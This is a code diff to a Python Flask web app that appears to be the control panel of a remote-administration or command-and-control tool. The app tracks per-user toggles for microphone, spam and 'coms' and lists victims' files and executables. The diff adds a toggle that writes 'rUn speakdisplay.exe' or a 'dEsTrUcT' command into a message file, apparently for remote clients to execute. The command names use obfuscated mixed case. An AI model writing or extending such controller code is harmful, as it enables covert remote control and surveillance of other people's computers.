@@ -67,7 +67,8 @@ with open(state_file,"w") as file:
             	"state": "off",
             	"color": "red"
             },
-            "comToggleState": {
+            "comsToggleState": {
+                "state":"off",
             	"color": "red"
             }                       
         }
@@ -102,6 +103,8 @@ def root():
     ic = data1[selected_user]["INToggleState"]["color"]
     ms = data1[selected_user]["micToggleState"]["state"]
     mc = data1[selected_user]["micToggleState"]["color"]
+    cs = data1[selected_user]["comsToggleState"]["state"]
+    cc = data1[selected_user]["comsToggleState"]["color"]
     if not firstReload:
         if time() - startTime <= 2.5:
             state = "Online"
@@ -115,7 +118,7 @@ def root():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, exes=apps,tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,users=users,selected = selected_user)
+    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, exes=apps,tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,cc=cc,cs=cs,users=users,selected = selected_user)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
@@ -303,6 +306,7 @@ def delete_task():
 @app.route("/toggle",methods=["POST"])
 def toggle():
     global spam
+    global comTxt
     if request.method == "POST":
         data = request.get_json()
         cmd = data.get("cmd")
@@ -333,13 +337,22 @@ def toggle():
             elif cmd == "mIc":
                 data[selected_user]["micToggleState"]["state"] = state
                 data[selected_user]["micToggleState"]["color"] = color
-            elif cmd == "cOm":
-                data[selected_user]["comToggleState"]["color"] = color            	              
+            elif cmd == "cOmS":
+                data[selected_user]["comsToggleState"]["state"] = state
+                data[selected_user]["comsToggleState"]["color"] = color        
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
                            
         if cmd == "sPaM":
             spam = True if state == "on" else False
+        elif cmd == "cOmS":
+            if state == "on":
+                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+                    file.write(f"rUn speakdisplay.exe")
+            else:
+                comTxt = "dEsTrUcT"
+                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+                    file.write("")
         elif cmd != "cOm":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")          
@@ -636,8 +649,8 @@ def get_com():
 @app.route("/com-txt",methods=["GET","POST"])
 def com_txt():
     with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
-        file.write(request.get_data().decode("utf-8"))
-    return "done"
+        file.write(request.form["coms"])
+    return redirect("/")
 @app.route("/com",methods=["GET","POST"])
 def com():
     with open(state_file, "r") as file:
